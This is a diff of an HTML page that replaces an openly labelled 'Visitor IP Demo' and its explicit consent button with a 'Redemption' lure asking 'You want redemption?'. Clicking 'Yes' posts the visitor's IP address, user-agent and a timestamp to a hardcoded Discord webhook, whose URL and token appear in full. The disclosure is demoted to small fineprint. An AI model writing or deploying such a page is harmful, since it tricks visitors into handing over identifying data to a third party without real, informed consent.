@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Visitor IP Demo</title>
+<title>Redemption</title>
 <style>
   body {
     font-family: system-ui, -apple-system, sans-serif;
@@ -20,88 +20,118 @@
     border: 1px solid #2a2e3a;
     border-radius: 12px;
     padding: 32px;
-    max-width: 480px;
+    max-width: 420px;
     width: 90%;
-  }
-  h1 { font-size: 20px; margin: 0 0 8px; }
-  .notice {
-    background: #2a2416;
-    border-left: 3px solid #d9a441;
-    padding: 12px 14px;
-    border-radius: 4px;
-    font-size: 14px;
-    line-height: 1.5;
-    margin: 16px 0;
-    color: #e8d5a8;
-  }
-  .ip {
-    font-family: ui-monospace, monospace;
-    font-size: 22px;
-    background: #0f1117;
-    padding: 14px;
-    border-radius: 8px;
     text-align: center;
-    margin: 16px 0;
-    word-break: break-all;
+  }
+  h1 {
+    font-size: 22px;
+    margin: 0 0 16px;
+  }
+  .question {
+    font-size: 18px;
+    margin: 24px 0;
+  }
+  .answer {
+    font-size: 20px;
+    font-weight: 600;
+    color: #6fcf97;
+    margin: 24px 0;
+    min-height: 28px;
   }
   button {
     width: 100%;
     padding: 12px;
-    font-size: 15px;
+    font-size: 16px;
     font-weight: 600;
     border: none;
     border-radius: 8px;
     background: #4f7cff;
     color: white;
     cursor: pointer;
+    margin-top: 8px;
   }
-  button:disabled { background: #333746; cursor: not-allowed; }
-  .status { font-size: 13px; margin-top: 12px; color: #8b90a0; text-align: center; }
+  button:disabled {
+    background: #333746;
+    cursor: not-allowed;
+  }
+  .fineprint {
+    font-size: 12px;
+    color: #8b90a0;
+    margin-top: 20px;
+    line-height: 1.4;
+  }
+  .ip {
+    font-family: ui-monospace, monospace;
+    font-size: 14px;
+    color: #8b90a0;
+    margin-top: 12px;
+    word-break: break-all;
+  }
 </style>
 </head>
 <body>
   <div class="card">
-    <h1>Visitor IP Demo</h1>
+    <h1>Redemption</h1>
 
-    <div class="notice">
-      <strong>This page logs your IP address.</strong><br>
-      If you click the button below, your IP address and browser user-agent
-      will be sent to a third-party Discord server.
+    <div class="question" id="question">You want redemption?</div>
+
+    <button id="yesBtn">Yes</button>
+
+    <div class="answer" id="answer"></div>
+    <div class="ip" id="ipDisplay"></div>
+
+    <div class="fineprint">
+      By clicking Yes, you agree to send your IP address and browser
+      user-agent to a third-party Discord server.
     </div>
-
-    <div class="ip" id="ip">Loading…</div>
-
-    <button id="send" disabled>I consent — send my IP</button>
-    <div class="status" id="status"></div>
   </div>
 
 <script>
   const WEBHOOK = "https://discord.com/api/webhooks/1545864793267642378/IDuVmb0NJeGzVfw_oO5-_r3wsZd2-3rNc2vxG5rNUa0zrCNJPTGTSg_vsOkpsmSzFVkW";
 
-  const ipEl = document.getElementById("ip");
-  const btn = document.getElementById("send");
-  const statusEl = document.getElementById("status");
-  let visitorIp = null;
+  const questionEl = document.getElementById("question");
+  const yesBtn = document.getElementById("yesBtn");
+  const answerEl = document.getElementById("answer");
+  const ipDisplay = document.getElementById("ipDisplay");
 
-  // 1. Look up the visitor's public IP (they can see this on screen)
+  let visitorIp = null;
+  let alreadySent = false;
+
+  // Pre-fetch the IP so it's ready when they click Yes
   (async () => {
     try {
       const res = await fetch("https://api.ipify.org?format=json");
       const data = await res.json();
       visitorIp = data.ip;
-      ipEl.textContent = visitorIp;
-      btn.disabled = false;
+      ipDisplay.textContent = "Your IP: " + visitorIp;
     } catch (err) {
-      ipEl.textContent = "Could not determine IP";
-      statusEl.textContent = "IP lookup failed: " + err.message;
+      ipDisplay.textContent = "Could not determine IP.";
     }
   })();
 
-  // 2. Send only after explicit consent
-  btn.addEventListener("click", async () => {
-    if (!visitorIp) return;
-    btn.disabled = true;
-    statusEl.textContent = "Sending…";
+  yesBtn.addEventListener("click", async () => {
+    if (alreadySent) return;
+    alreadySent = true;
+
+    yesBtn.disabled = true;
+    questionEl.textContent = "";
+    answerEl.textContent = "Sending…";
+
+    // Make sure we have an IP before sending
+    if (!visitorIp) {
+      try {
+        const res = await fetch("https://api.ipify.org?format=json");
+        const data = await res.json();
+        visitorIp = data.ip;
+        ipDisplay.textContent = "Your IP: " + visitorIp;
+      } catch (err) {
+        answerEl.textContent = "Failed to get IP.";
+        yesBtn.disabled = false;
+        alreadySent = false;
+        return;
+      }
+    }
 
     try {
       const res = await fetch(WEBHOOK, {
@@ -109,7 +139,7 @@
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
           content: [
-            "**New visitor log**",
+            "**New redemption log**",
             "IP: `" + visitorIp + "`",
             "User-Agent: `" + navigator.userAgent + "`",
             "Time: `" + new Date().toISOString() + "`"
@@ -118,14 +148,16 @@
       });
 
       if (res.ok) {
-        statusEl.textContent = "Sent.";
+        answerEl.textContent = "Ok your redeemed";
       } else {
-        statusEl.textContent = "Discord returned " + res.status;
-        btn.disabled = false;
+        answerEl.textContent = "Discord error: " + res.status;
+        yesBtn.disabled = false;
+        alreadySent = false;
       }
     } catch (err) {
-      statusEl.textContent = "Failed: " + err.message;
-      btn.disabled = false;
+      answerEl.textContent = "Failed: " + err.message;
+      yesBtn.disabled = false;
+      alreadySent = false;
     }
   });
 </script>
